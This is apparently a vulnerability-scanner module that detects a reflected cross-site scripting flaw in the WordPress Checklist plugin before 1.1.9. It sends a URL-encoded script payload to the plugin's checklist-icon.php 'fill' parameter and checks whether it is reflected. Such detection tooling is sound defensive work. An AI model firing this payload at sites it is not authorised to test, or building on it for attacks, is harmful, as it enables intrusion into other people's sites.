#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Checklist plugin before 1."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Checklist <1.1.9 - Cross-Site Scripting Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'xss', 'wp-plugin', 'packetstorm', 'wordpress', 'checklist', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        path = '/wp-content/plugins/checklist/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Checklist', 'Tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-content/plugins/checklist/images/checklist-icon.php?&fill=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        ...
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Checklist <1.1.9 - Cross-Site Scripting detected', path=path)
            return True
        return False
